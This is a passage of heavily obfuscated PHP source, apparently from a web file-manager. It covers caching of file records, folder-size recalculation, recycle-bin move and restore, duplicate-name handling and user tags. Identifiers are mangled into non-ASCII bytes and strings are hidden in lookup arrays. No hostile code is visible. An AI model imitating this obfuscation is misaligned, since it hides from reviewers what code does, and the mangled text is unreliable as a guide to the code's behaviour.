$ËğÂº‹ = $¬ÜåĞæ[535] . $‚Òüì; $‰ª…ô±Ö = _get(self::$cacheSourceInfo, $ËğÂº‹); if ($‰ª…ô±Ö) { return $‰ª…ô±Ö; } $¾ø‚î±¶ = $this->where(array($¬ÜåĞæ[193] => $‚Òüì))->find(); self::$cacheSourceInfo[$ËğÂº‹] = $¾ø‚î±¶; return self::$cacheSourceInfo[$ËğÂº‹]; } public function sourceCacheClear($çá¼êÅğ = false) { self::cacheClear($çá¼êÅğ); } public static function cacheClear($·şñİ© = false) { $¾Ï†½ÏÓ =& $_SERVER[¡¬ıÜ ƒ]; if ($·şñİ© == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$¾Ï†½ÏÓ[535] . $·şñİ©]); unset(self::$cachePathInfoMore[$·şñİ©]); unset(self::$cachePathInfo[$¾Ï†½ÏÓ[2302] . $·şñİ©]); unset(self::$cachePathInfo[$¾Ï†½ÏÓ[2303] . $·şñİ©]); } public function metaSet($¹æòÈôœ, $…†ê¢ê¬ = null, $ç„¶³¯Â = null) { $Ü‚İÚüÈ = parent::metaSet($¹æòÈôœ, $…†ê¢ê¬, $ç„¶³¯Â); if ($Ü‚İÚüÈ) { $this->sourceCacheClear($¹æòÈôœ); } return $Ü‚İÚüÈ; } public function pathInfoByPath($üÎ¬Â¢á, $Œ¿®ÊÖ‰) { $”ø½¤á =& $_SERVER[¡¬ıÜ ƒ]; $ßÇ­€ = !$Œ¿®ÊÖ‰ ? array() : explode($”ø½¤á[8], trim($Œ¿®ÊÖ‰, $”ø½¤á[8])); $ ¹Ö×Å = $üÎ¬Â¢á; foreach ($ßÇ­€ as $ÍÏÖìÑÏ) { $áÃ”İÕ = array($”ø½¤á[192] => $ ¹Ö×Å, $”ø½¤á[32] => $ÍÏÖìÑÏ); $”÷€”Ñ° = $this->field($”ø½¤á[2304])->where($áÃ”İÕ)->select(); if (!$”÷€”Ñ°) { return !1; } $”÷€”Ñ° = array_sort_by($”÷€”Ñ°, $”ø½¤á[507]); $ ¹Ö×Å = $”÷€”Ñ°[0][$”ø½¤á[193]]; } $’Ö£‹•š = $this->sourceInfo($ ¹Ö×Å); $this->pathInfoFilter($’Ö£‹•š); return $’Ö£‹•š; } protected function updateModifyTime($­Ê¦À’) { $±ï±±“à =& $_SERVER[¡¬ıÜ ƒ]; $°åê¬©˜ = defined($±ï±±“à[2213]) ? USER_ID : 0; if (!$­Ê¦À’) { return; } if (!is_array($­Ê¦À’)) { $­Ê¦À’ = array($­Ê¦À’); } foreach ($­Ê¦À’ as $÷¯ıÎ‡Ş => $èÓ†¹‰) { $­Ê¦À’[$÷¯ıÎ‡Ş] = intval($èÓ†¹‰); $this->sourceCacheClear($èÓ†¹‰); } $÷­éšÀÎ = array($±ï±±“à[193] => array($±ï±±“à[7], $­Ê¦À’)); $Å­ˆÅ·» = array($±ï±±“à[656] => $°åê¬©˜, $±ï±±“à[500] => time()); $this->where($÷­éšÀÎ)->save($Å­ˆÅ·»); } public function folderSizeReset($ĞÔŞ¥î—, $¾²ÀËÁó = false) { $ÓñŸ¾ó¶ =& $_SERVER[¡¬ıÜ ƒ]; if ($this->statusIgnoreResetSpace) { return; } $ğ×Îºğ½ = $this->sourceInfo($ĞÔŞ¥î—); $¤ÊœÓäû = $ÓñŸ¾ó¶[2305] . $ĞÔŞ¥î—; CacheLock::lock($¤ÊœÓäû, 20); if ($¾²ÀËÁó === !1) { $this->sourceCacheClear($ĞÔŞ¥î—); $ğ×Îºğ½ = $this->sourceInfo($ĞÔŞ¥î—); $™ı÷µ„Æ = array($ÓñŸ¾ó¶[479] => $ĞÔŞ¥î—, $ÓñŸ¾ó¶[506] => 0); $™ú…ÓßÁ = $this->where($™ı÷µ„Æ)->sum($ÓñŸ¾ó¶[79]); $¾²ÀËÁó = intval($™ú…ÓßÁ) - intval($ğ×Îºğ½[$ÓñŸ¾ó¶[79]]); } if ($¾²ÀËÁó == 0) { return CacheLock::unlock($¤ÊœÓäû); } $Š¶ë›ÇŠ = $this->parentLevelArray($ğ×Îºğ½[$ÓñŸ¾ó¶[586]]); if (!$Š¶ë›ÇŠ) { $Š¶ë›ÇŠ = array(); } $Š¶ë›ÇŠ[] = $ğ×Îºğ½[$ÓñŸ¾ó¶[193]]; $™ı÷µ„Æ = array($ÓñŸ¾ó¶[193] => array($ÓñŸ¾ó¶[494], $Š¶ë›ÇŠ)); if ($¾²ÀËÁó < 0) { $™ı÷µ„Æ[$ÓñŸ¾ó¶[79]] = array($ÓñŸ¾ó¶[1103], abs($¾²ÀËÁó)); } $this->where($™ı÷µ„Æ)->setAdd($ÓñŸ¾ó¶[79], $¾²ÀËÁó); CacheLock::unlock($¤ÊœÓäû); $àÇÑ‡í± = $ÓñŸ¾ó¶[2306] . $ğ×Îºğ½[$ÓñŸ¾ó¶[190]] . $ÓñŸ¾ó¶[4] . $ğ×Îºğ½[$ÓñŸ¾ó¶[571]]; $°£ÇÛĞÂ = array($ğ×Îºğ½[$ÓñŸ¾ó¶[190]], $ğ×Îºğ½[$ÓñŸ¾ó¶[571]]); TaskRun::timeLimitCall($àÇÑ‡í±, $ÓñŸ¾ó¶[2307], $°£ÇÛĞÂ, 1.5); } public function folderSizeResetChildren($—½†Ÿ¿Ø) { $ûÌıÕŒ =& $_SERVER[¡¬ıÜ ƒ]; $this->sourceCacheClear($—½†Ÿ¿Ø); $ÍÎ¼Û·« = $this->sourceInfo($—½†Ÿ¿Ø); $ÉĞ¤¶·± = array($ûÌıÕŒ[651] => 1, $ûÌıÕŒ[654] => $ÍÎ¼Û·«[$ûÌıÕŒ[571]], $ûÌıÕŒ[657] => array($ûÌıÕŒ[617], $ÍÎ¼Û·«[$ûÌıÕŒ[586]] . $—½†Ÿ¿Ø . $ûÌıÕŒ[618])); $÷¬½›Ëç = $ûÌıÕŒ[2308]; $‘ëªÛ¹ = $this->field($÷¬½›Ëç)->where($ÉĞ¤¶·±)->select(); $ÉĞ¤¶·±[$ûÌıÕŒ[487]] = 0; $ùš’ŠÙ‚ = $this->field($÷¬½›Ëç)->where($ÉĞ¤¶·±)->select(); if (!$ùš’ŠÙ‚) { return; } $‘ëªÛ¹[] = $ÍÎ¼Û·«; $‘ëªÛ¹ = array_to_keyvalue($‘ëªÛ¹, $ûÌıÕŒ[193]); foreach ($‘ëªÛ¹ as $®™”ş³æ => $”®›üŠ) { $‘ëªÛ¹[$®™”ş³æ][$ûÌıÕŒ[2309]] = $‘ëªÛ¹[$®™”ş³æ][$ûÌıÕŒ[79]]; $‘ëªÛ¹[$®™”ş³æ][$ûÌıÕŒ[79]] = 0; } foreach ($ùš’ŠÙ‚ as $”®›üŠ) { $Ëò†ÛŒç = $”®›üŠ[$ûÌıÕŒ[192]] . $ûÌıÕŒ[12]; if (!isset($‘ëªÛ¹[$Ëò†ÛŒç])) { continue; } if ($”®›üŠ[$ûÌıÕŒ[507]] == $‘ëªÛ¹[$Ëò†ÛŒç][$ûÌıÕŒ[507]]) { $‘ëªÛ¹[$Ëò†ÛŒç][$ûÌıÕŒ[79]] += $”®›üŠ[$ûÌıÕŒ[79]]; } } foreach ($‘ëªÛ¹ as $”®›üŠ) { $¿àŞ¬º§ = $this->parentLevelArray($”®›üŠ[$ûÌıÕŒ[586]]); foreach ($¿àŞ¬º§ as $Ëò†ÛŒç) { $Ëò†ÛŒç = $Ëò†ÛŒç . $ûÌıÕŒ[12]; if (!isset($‘ëªÛ¹[$Ëò†ÛŒç])) { continue; } if ($”®›üŠ[$ûÌıÕŒ[507]] == $‘ëªÛ¹[$Ëò†ÛŒç][$ûÌıÕŒ[507]]) { $‘ëªÛ¹[$Ëò†ÛŒç][$ûÌıÕŒ[79]] += $”®›üŠ[$ûÌıÕŒ[79]]; } } } $âğ¡ÚÏô = array(); foreach ($‘ëªÛ¹ as $”®›üŠ) { if ($”®›üŠ[$ûÌıÕŒ[79]] == $”®›üŠ[$ûÌıÕŒ[2309]]) { continue; } $âğ¡ÚÏô[] = array($ûÌıÕŒ[193], $”®›üŠ[$ûÌıÕŒ[193]], $ûÌıÕŒ[79], $”®›üŠ[$ûÌıÕŒ[79]]); } $this->saveAll($âğ¡ÚÏô); } public function userSpaceReset($ÄÓê‡Ì– = false) { $€õÊÎ¿ =& $_SERVER[¡¬ıÜ ƒ]; $Ì™Š¾ÛË = $this->where(array($€õÊÎ¿[190] => self::TYPE_USER, $€õÊÎ¿[571] => $ÄÓê‡Ì–, $€õÊÎ¿[487] => 0))->sum($€õÊÎ¿[79]); $Ì™Š¾ÛË = !$Ì™Š¾ÛË || $Ì™Š¾ÛË <= 0 ? 0 : $Ì™Š¾ÛË; Model($€õÊÎ¿[579])->userEdit($ÄÓê‡Ì–, array($€õÊÎ¿[1974] => $Ì™Š¾ÛË)); } public function targetSpaceUpdate($¨Õ¨Ù§Ç, $ì–§“âÚ) { $ëßÛÕ—ê =& $_SERVER[¡¬ıÜ ƒ]; if (!$ì–§“âÚ) { return; } if (!in_array($¨Õ¨Ù§Ç, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $óÇ¡¤ï = $this->targetSpaceSize($¨Õ¨Ù§Ç, $ì–§“âÚ); if ($¨Õ¨Ù§Ç == self::TYPE_USER) { Model($ëßÛÕ—ê[579])->userEdit($ì–§“âÚ, array($ëßÛÕ—ê[1974] => $óÇ¡¤ï)); } else { if ($¨Õ¨Ù§Ç == self::TYPE_GROUP) { Model($ëßÛÕ—ê[587])->groupEdit($ì–§“âÚ, array($ëßÛÕ—ê[1974] => $óÇ¡¤ï)); } } } public function targetSpaceSize($®¤ñú«, $‡›ñ±Ê) { $Í ÓîüË =& $_SERVER[¡¬ıÜ ƒ]; $¦¼âš“³ = 0; $ğëêÈË = $this->targetSourceRoot($®¤ñú«, $‡›ñ±Ê, !0); foreach ($ğëêÈË as $§ÈÅÆ’½) { if (!$§ÈÅÆ’½) { continue; } $¦¼âš“³ += floatval($§ÈÅÆ’½[$Í ÓîüË[79]]); $ŠöÏ½Ì† = array($Í ÓîüË[657] => array($Í ÓîüË[617], $Í ÓîüË[595] . $§ÈÅÆ’½[$Í ÓîüË[193]] . $Í ÓîüË[618])); $è•à© = Model($Í ÓîüË[505])->field($Í ÓîüË[493])->where($ŠöÏ½Ì†)->select(); $è•à© = array_to_keyvalue($è•à©, $Í ÓîüË[12], $Í ÓîüË[193]); $è•à© = array_unique(array_filter($è•à©)); if ($è•à©) { $ŠöÏ½Ì† = array($Í ÓîüË[493] => array($Í ÓîüË[494], $è•à©)); $¦¼âš“³ += floatval($this->where($ŠöÏ½Ì†)->sum($Í ÓîüË[79])); } } $¦¼âš“³ = !$¦¼âš“³ || $¦¼âš“³ <= 0 ? 0 : $¦¼âš“³; return $¦¼âš“³; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($¿¾û°úß) { return $this->fileTypeProfile($¿¾û°úß, SourceModel::TYPE_USER); } public function groupFileTypeProfile($Àìî¹–›) { return $this->fileTypeProfile($Àìî¹–›, SourceModel::TYPE_GROUP); } private function fileTypeProfile($çÂœŞÇÌ, $ˆÕüˆÒ) { $ª‹ü³Ôù =& $_SERVER[¡¬ıÜ ƒ]; $çÈÔÏƒ‰ = $ª‹ü³Ôù[2310] . $çÂœŞÇÌ . $ª‹ü³Ôù[11] . $ˆÕüˆÒ; $Ë£¤ò± = Cache::get($çÈÔÏƒ‰); if ($Ë£¤ò±) { return $Ë£¤ò±; } $èŠŸ¦¶ = array($ª‹ü³Ôù[651] => 0); if ($çÂœŞÇÌ != !1) { $èŠŸ¦¶[$ª‹ü³Ôù[571]] = $çÂœŞÇÌ; $èŠŸ¦¶[$ª‹ü³Ôù[190]] = $ˆÕüˆÒ; } $çÚÙ—²½ = array(); $çÚÙ—²½[$ª‹ü³Ôù[2311]] = array($ª‹ü³Ôù[2312] => LNG($ª‹ü³Ôù[2311]), $ª‹ü³Ôù[2313] => $this->where($èŠŸ¦¶)->count(), $ª‹ü³Ôù[622] => $this->where($èŠŸ¦¶)->sum($ª‹ü³Ôù[79])); $Ù…¦šÌ = KodIO::fileTypeList(); foreach ($Ù…¦šÌ as $©ıÍˆ¢„ => $Ä·ı‡ºù) { $èŠŸ¦¶[$ª‹ü³Ôù[488]] = $this->fileTypeWhere($©ıÍˆ¢„); $çÚÙ—²½[$©ıÍˆ¢„] = array($ª‹ü³Ôù[2312] => $Ä·ı‡ºù[$ª‹ü³Ôù[32]], $ª‹ü³Ôù[2313] => $this->where($èŠŸ¦¶)->count(), $ª‹ü³Ôù[622] => $this->where($èŠŸ¦¶)->sum($ª‹ü³Ôù[79])); } Cache::set($çÈÔÏƒ‰, $çÚÙ—²½, 1200); return $çÚÙ—²½; } public function fileNameExist($ˆÀğİ¸», $©ß¨—±ô) { $µ©œ¨Ä =& $_SERVER[¡¬ıÜ ƒ]; $‘óÅ¡ûë = $this->field($µ©œ¨Ä[2314])->where(array($µ©œ¨Ä[192] => $ˆÀğİ¸», $µ©œ¨Ä[32] => $©ß¨—±ô, $µ©œ¨Ä[507] => 0))->find(); return is_array($‘óÅ¡ûë) ? $‘óÅ¡ûë[$µ©œ¨Ä[193]] : !1; } public function childList($¹‹¥…¹) { $Ä»ûï°» =& $_SERVER[¡¬ıÜ ƒ]; $û»ÛëÇö = $Ä»ûï°»[2287] . $¹‹¥…¹; if (isset(self::$cacheChildList[$û»ÛëÇö])) { return self::$cacheChildList[$û»ÛëÇö]; } $Ê´¼— = array($Ä»ûï°»[192] => intval($¹‹¥…¹), $Ä»ûï°»[507] => 0); $õåÏ«ªõ = $this->where($Ê´¼—)->select(); $õåÏ«ªõ = $õåÏ«ªõ ? $õåÏ«ªõ : array(); self::$cacheChildList[$û»ÛëÇö] = $õåÏ«ªõ; foreach ($õåÏ«ªõ as $ÉËü‹³Ô) { $û»ÛëÇö = $Ä»ûï°»[535] . $ÉËü‹³Ô[$Ä»ûï°»[193]]; self::$cacheSourceInfo[$û»ÛëÇö] = $ÉËü‹³Ô; } return $õåÏ«ªõ; } public function fileNameAuto($Ï—ºœ€¤, $ƒğ²µ«ˆ, $ÑÑëö”é = REPEAT_RENAME, $Â‘à§½ = false) { $Ø³†Š«¸ =& $_SERVER[¡¬ıÜ ƒ]; $õÖòáê = get_path_ext($ƒğ²µ«ˆ); $İÌ“üá = $õÖòáê ? get_path_ext_name($ƒğ²µ«ˆ) . $Ø³†Š«¸[2315] . $õÖòáê : $ƒğ²µ«ˆ . $Ø³†Š«¸[462]; $å˜­Õú» = array($Ø³†Š«¸[192] => $Ï—ºœ€¤, $Ø³†Š«¸[507] => 0, $Ø³†Š«¸[32] => array($Ø³†Š«¸[461], $İÌ“üá)); $ë±ÕÆÓİ = $this->field($Ø³†Š«¸[32])->where($å˜­Õú»)->select(); $ô²ÂêÖ = array_to_keyvalue($ë±ÕÆÓİ, $Ø³†Š«¸[12], $Ø³†Š«¸[32]); return $this->fileNameAutoGet($ô²ÂêÖ, $ƒğ²µ«ˆ, $ÑÑëö”é, $Â‘à§½); } public function fileNameAutoGet($ä›à·Ù, $¯„ı¬Ä, $ºšØïÜ, $°®Á¥ƒÆ) { $×‹¦‡‹Ö =& $_SERVER[¡¬ıÜ ƒ]; if ($ºšØïÜ == REPEAT_REPLACE || !$ä›à·Ù || !in_array_not_case($¯„ı¬Ä, $ä›à·Ù) || $°®Á¥ƒÆ && $ºšØïÜ != REPEAT_RENAME_FOLDER) { return $¯„ı¬Ä; } if ($ºšØïÜ == REPEAT_SKIP) { return !1; } $Á¤½²î­ = $×‹¦‡‹Ö[10] . get_path_ext($¯„ı¬Ä); $Á¤½²î­ = $Á¤½²î­ == $×‹¦‡‹Ö[10] || $°®Á¥ƒÆ ? $×‹¦‡‹Ö[12] : $Á¤½²î­; for ($‘‘ïÍ´ª = 1; $‘‘ïÍ´ª <= count($ä›à·Ù) + 1; $‘‘ïÍ´ª++) { $ü´ˆ– = substr($¯„ı¬Ä, 0, strlen($¯„ı¬Ä) - strlen($Á¤½²î­)); $úø©ÈĞá = $ü´ˆ– . "\x28{$‘‘ïÍ´ª}\x29{$Á¤½²î­}"; if (!in_array_not_case($úø©ÈĞá, $ä›à·Ù)) { return $úø©ÈĞá; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\157\165\162\x63\145\x5f\162\x65\143\171\143\x6c\x65"; protected $dataAuto = array(array("\x63\162\145\x61\164\145\x54\x69\x6d\145", "\164\151\x6d\145", "\x69\156\x73\x65\x72\x74", "\146\x75\156\143\x74\x69\x6f\x6e")); public function listData($»¯ïªİ­ = false) { $ì€ Ä¶­ =& $_SERVER[¡¬ıÜ ƒ]; $»¯ïªİ­ = $»¯ïªİ­ ? $»¯ïªİ­ : USER_ID; $İ©ïç¢ô = $this->where(array($ì€ Ä¶­[1776] => $»¯ïªİ­))->select(); return array_to_keyvalue($İ©ïç¢ô, $ì€ Ä¶­[12], $ì€ Ä¶­[193]); } public function moveToRecycle($ş°ô¤‚›) { $µÙªãÅŠ =& $_SERVER[¡¬ıÜ ƒ]; $èë¼ê = Model($µÙªãÅŠ[1432]); $ ûµçß = $èë¼ê->sourceInfo($ş°ô¤‚›); if (!$ ûµçß || $ ûµçß[$µÙªãÅŠ[507]] == $µÙªãÅŠ[91]) { return; } $À†¡ˆø = array($µÙªãÅŠ[493] => $ş°ô¤‚›, $µÙªãÅŠ[1776] => USER_ID, $µÙªãÅŠ[653] => $ ûµçß[$µÙªãÅŠ[190]], $µÙªãÅŠ[654] => $ ûµçß[$µÙªãÅŠ[571]], $µÙªãÅŠ[657] => $ ûµçß[$µÙªãÅŠ[586]]); $this->add($À†¡ˆø); $this->recycleMove($ş°ô¤‚›, 1); if ($ ûµçß[$µÙªãÅŠ[487]] == $µÙªãÅŠ[91]) { $ÔîÉ§¾ = array($µÙªãÅŠ[657] => array($µÙªãÅŠ[617], $ ûµçß[$µÙªãÅŠ[586]] . $ş°ô¤‚› . $µÙªãÅŠ[618])); $èë¼ê->where($ÔîÉ§¾)->setField($µÙªãÅŠ[507], 1); } } public function clear() { $this->remove(!1); } public function remove($Í¿ò±¥• = false, $ÔŠÛ˜ßĞ = false) { $®…úú´Š =& $_SERVER[¡¬ıÜ ƒ]; $ÔŠÛ˜ßĞ = $ÔŠÛ˜ßĞ ? $ÔŠÛ˜ßĞ : USER_ID; $Ú¶µ™Æ± = Model($®…úú´Š[1432]); $­ò©ØŸ = $this->listData($ÔŠÛ˜ßĞ); $Í¿ò±¥• = $Í¿ò±¥• === !1 ? !1 : $Í¿ò±¥•; $Ò¼¥†¯ä = array(); foreach ($­ò©ØŸ as $Üà¦šª¿) { if ($Í¿ò±¥• != !1 && !in_array($Üà¦šª¿, $Í¿ò±¥•)) { continue; } $Ü÷ô¶Šç = $Ú¶µ™Æ±->sourceInfo($Üà¦šª¿); $Ú¶µ™Æ±->remove($Üà¦šª¿, !1); $—Ú¸ˆ› = $Ü÷ô¶Šç[$®…úú´Š[190]] . $®…úú´Š[11] . $Ü÷ô¶Šç[$®…úú´Š[571]]; $Ò¼¥†¯ä[$—Ú¸ˆ›] = array($®…úú´Š[653] => $Ü÷ô¶Šç[$®…úú´Š[190]], $®…úú´Š[571] => $Ü÷ô¶Šç[$®…úú´Š[571]]); $this->where(array($®…úú´Š[193] => $Üà¦šª¿))->delete(); } foreach ($Ò¼¥†¯ä as $æÓƒ¹Èˆ) { $Ú¶µ™Æ±->targetSpaceUpdate($æÓƒ¹Èˆ[$®…úú´Š[190]], $æÓƒ¹Èˆ[$®…úú´Š[571]]); } } public function restore($Ò…ÀÀ´è = false) { $Ã´Õ™’Œ = $this->listData(); $this->_restoreSource($Ã´Õ™’Œ, $Ò…ÀÀ´è); } public function removeUserAll($—áÖªÜÙ) { $this->remove(!1, $—áÖªÜÙ); } public function restoreItem($”ï¿¸¾) { $this->_restoreSource(array($”ï¿¸¾), array($”ï¿¸¾)); } private function _restoreSource($ÊÌ€Ú•, $ø£¢‡ƒÑ) { $ÊõÔõØã =& $_SERVER[¡¬ıÜ ƒ]; $ğŞ€ÉÊ = Model($ÊõÔõØã[1432]); $ø£¢‡ƒÑ = $ø£¢‡ƒÑ == !1 ? !1 : $ø£¢‡ƒÑ; if (!$ÊÌ€Ú•) { return !0; } $ã¿¡®ËÏ = array(); foreach ($ÊÌ€Ú• as $â«ÖÒ¼¬) { if ($ø£¢‡ƒÑ != !1 && !in_array($â«ÖÒ¼¬, $ø£¢‡ƒÑ)) { continue; } $‚Ó§º¸‚ = $ğŞ€ÉÊ->sourceInfo($â«ÖÒ¼¬); $ßüüÄ¤Ú = $ğŞ€ÉÊ->sourceInfo($‚Ó§º¸‚[$ÊõÔõØã[192]]); if ($ßüüÄ¤Ú[$ÊõÔõØã[507]] == $ÊõÔõØã[91]) { continue; } $ğŞ€ÉÊ->lockMoveStart($â«ÖÒ¼¬); $this->recycleMove($â«ÖÒ¼¬, 0); if ($‚Ó§º¸‚[$ÊõÔõØã[487]] == $ÊõÔõØã[91]) { $±¸ÔİÚ = array($ÊõÔõØã[657] => array($ÊõÔõØã[617], $‚Ó§º¸‚[$ÊõÔõØã[586]] . $â«ÖÒ¼¬ . $ÊõÔõØã[618])); $ğŞ€ÉÊ->where($±¸ÔİÚ)->setField($ÊõÔõØã[507], 0); $this->restoreFolderChildren($â«ÖÒ¼¬, $ÊÌ€Ú•); } $this->where(array($ÊõÔõØã[193] => $â«ÖÒ¼¬))->delete(); $ğŞ€ÉÊ->folderSizeReset($‚Ó§º¸‚[$ÊõÔõØã[192]]); $ã¿¡®ËÏ[] = $‚Ó§º¸‚[$ÊõÔõØã[192]]; if ($‚Ó§º¸‚[$ÊõÔõØã[487]] == $ÊõÔõØã[91]) { $ã¿¡®ËÏ[] = $â«ÖÒ¼¬; } $ğŞ€ÉÊ->lockMoveEnd($â«ÖÒ¼¬); } $ğŞ€ÉÊ->updateModifyTime($ã¿¡®ËÏ); } private function restoreFolderChildren($‚Â¹®®×, $Õ’ÍŸõ‰) { $ãÒÍ˜¥ü =& $_SERVER[¡¬ıÜ ƒ]; $¡’ÅøŠœ = Model($ãÒÍ˜¥ü[1432]); $ä˜œø¿ï = array($ãÒÍ˜¥ü[193] => array($ãÒÍ˜¥ü[7], array())); foreach ($Õ’ÍŸõ‰ as $·ôÍºÓ) { if ($·ôÍºÓ == $‚Â¹®®×) { continue; } if (!$¡’ÅøŠœ->isParentOf($‚Â¹®®×, $·ôÍºÓ)) { continue; } $ãÊŒ™ş = $¡’ÅøŠœ->sourceInfo($·ôÍºÓ); if ($ãÊŒ™ş[$ãÒÍ˜¥ü[487]] == $ãÒÍ˜¥ü[91]) { $ä˜œø¿ï[] = array($ãÒÍ˜¥ü[657] => array($ãÒÍ˜¥ü[617], $ãÊŒ™ş[$ãÒÍ˜¥ü[586]] . $·ôÍºÓ . $ãÒÍ˜¥ü[618])); } else { $ä˜œø¿ï[$ãÒÍ˜¥ü[193]][1][] = $·ôÍºÓ; } } if (!$ä˜œø¿ï[$ãÒÍ˜¥ü[193]][1]) { unset($ä˜œø¿ï[$ãÒÍ˜¥ü[193]]); } if (!$ä˜œø¿ï) { return; } if (is_array($ä˜œø¿ï[$ãÒÍ˜¥ü[193]]) && is_array($ä˜œø¿ï[$ãÒÍ˜¥ü[193]][1])) { $ä˜œø¿ï[$ãÒÍ˜¥ü[193]][1] = array_unique($ä˜œø¿ï[$ãÒÍ˜¥ü[193]][1]); } $ä˜œø¿ï[$ãÒÍ˜¥ü[1088]] = $ãÒÍ˜¥ü[2088]; $¡’ÅøŠœ->where($ä˜œø¿ï)->setField($ãÒÍ˜¥ü[507], 1); } private function recycleMove($³Õ¹¿â½, $ÄÍ˜õ— = 1) { $ÊÀ‚şş =& $_SERVER[¡¬ıÜ ƒ]; $§áåÃó¨ = Model($ÊÀ‚şş[1432]); $»»åì” = Model($ÊÀ‚şş[2316]); $ŸÖß÷¸· = array($ÊÀ‚şş[193] => $³Õ¹¿â½); if ($ÄÍ˜õ—) { $§áåÃó¨->where($ŸÖß÷¸·)->setField($ÊÀ‚şş[507], 1); $»»åì”->eventRecycle($³Õ¹¿â½, $ÊÀ‚şş[2317]); } else { $¥ÜÊ¶œ = $§áåÃó¨->where($ŸÖß÷¸·)->find(); $²ß´×’ = $¥ÜÊ¶œ[$ÊÀ‚şş[487]] == $ÊÀ‚şş[91]; $ÇúÍ×õÈ = $§áåÃó¨->fileNameAuto($¥ÜÊ¶œ[$ÊÀ‚şş[192]], $¥ÜÊ¶œ[$ÊÀ‚şş[32]], REPEAT_RENAME_FOLDER, $²ß´×’); if ($ÇúÍ×õÈ != $¥ÜÊ¶œ[$ÊÀ‚şş[32]]) { $§áåÃó¨->rename($³Õ¹¿â½, $ÇúÍ×õÈ); } $§áåÃó¨->where($ŸÖß÷¸·)->setField($ÊÀ‚şş[507], 0); $»»åì”->eventRecycle($³Õ¹¿â½, $ÊÀ‚şş[2318]); } } } goto BˆÄÜùì…‡; dÕ¸®ò˜‚: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\x65\x72\137\x66\141\x76"; protected function cacheFunctionAlias($¿˜ÑŠ–) { $Õå¯¼Âñ =& $_SERVER[¡¬ıÜ ƒ]; return array($Õå¯¼Âñ[2101] => array($Õå¯¼Âñ[2524] . USER_ID, $Õå¯¼Âñ[2102])); } protected function listData() { $®¾ùº²£ =& $_SERVER[¡¬ıÜ ƒ]; $¼ÎÚÅâ = array($®¾ùº²£[1776] => USER_ID, $®¾ùº²£[559] => array($®¾ùº²£[2105], 0)); $‹ñô­Æˆ = $®¾ùº²£[2525]; $‰ïŞû°İ = $this->field($‹ñô­Æˆ)->where($¼ÎÚÅâ)->order($®¾ùº²£[2108])->select(); return $‰ïŞû°İ ? $‰ïŞû°İ : array(); } protected function addToTag($øôõÔ˜, $¾£¹ÏÛœ) { $â²®ğ˜ =& $_SERVER[¡¬ıÜ ƒ]; if (!Model($â²®ğ˜[2254])->listData($¾£¹ÏÛœ)) { return !1; } if (is_numeric($øôõÔ˜)) { $À‹ğÉ…Ì = Model($â²®ğ˜[914])->pathInfo($øôõÔ˜); if (!$À‹ğÉ…Ì) { return !1; } } else { $À‹ğÉ…Ì = IO::infoSimple($øôõÔ˜); if (!$À‹ğÉ…Ì) { return !1; } $ª–²…–¨ = $À‹ğÉ…Ì[$â²®ğ˜[32]]; $ğ÷œÁ…Õ = $À‹ğÉ…Ì[$â²®ğ˜[33]]; if (isset($À‹ğÉ…Ì[$â²®ğ˜[487]])) { $ğ÷œÁ…Õ = $À‹ğÉ…Ì[$â²®ğ˜[487]] == $â²®ğ˜[91] ? $â²®ğ˜[78] : $â²®ğ˜[232]; } } $’×«ÙöÓ = array($â²®ğ˜[1776] => USER_ID, $â²®ğ˜[559] => $¾£¹ÏÛœ, $â²®ğ˜[497] => $øôõÔ˜, $â²®ğ˜[498] => $ğ÷œÁ…Õ ? $ğ÷œÁ…Õ : $â²®ğ˜[492], $â²®ğ˜[496] => $ª–²…–¨ ? $ª–²…–¨ : $â²®ğ˜[12], $â²®ğ˜[1990] => 0); if ($this->where($’×«ÙöÓ)->find()) { return !1; } return $this->add($’×«ÙöÓ); } protected function removeFromTag($‰ªÈ„¨Î, $ÓÛ¸Æåî) { $Ò»Î–½ş =& $_SERVER[¡¬ıÜ ƒ]; if (!Model($Ò»Î–½ş[2254])->listData($ÓÛ¸Æåî)) { return !1; } if (is_array($‰ªÈ„¨Î)) { $‰ªÈ„¨Î = array($Ò»Î–½ş[7], $‰ªÈ„¨Î); } $¥ÍöÖ˜ß = array($Ò»Î–½ş[1776] => USER_ID, $Ò»Î–½ş[559] => $ÓÛ¸Æåî, $Ò»Î–½ş[497] => $‰ªÈ„¨Î); return $this->where($¥ÍöÖ˜ß)->delete(); } protected function removeByTag($ğ¤‰ˆøË) { $‰ìŞíÂÜ =& $_SERVER[¡¬ıÜ ƒ]; if (!$ğ¤‰ˆøË) { return !1; } $Ã½¦ãù = array($‰ìŞíÂÜ[1776] => USER_ID, $‰ìŞíÂÜ[559] => $ğ¤‰ˆøË); return $this->where($Ã½¦ãù)->delete(); } protected function removeBySource($ÑÓ­×·±) { $ÆºÖı¥¨ =& $_SERVER[¡¬ıÜ ƒ]; if (is_array($ÑÓ­×·±)) { $ÑÓ­×·± = array($ÆºÖı¥¨[7], $ÑÓ­×·±); } $ ì·™¯È = array($ÆºÖı¥¨[1776] => USER_ID, $ÆºÖı¥¨[559] => array($ÆºÖı¥¨[1102], 0), $ÆºÖı¥¨[497] => $ÑÓ­×·±); return $this->where($ ì·™¯È)->delete(); } }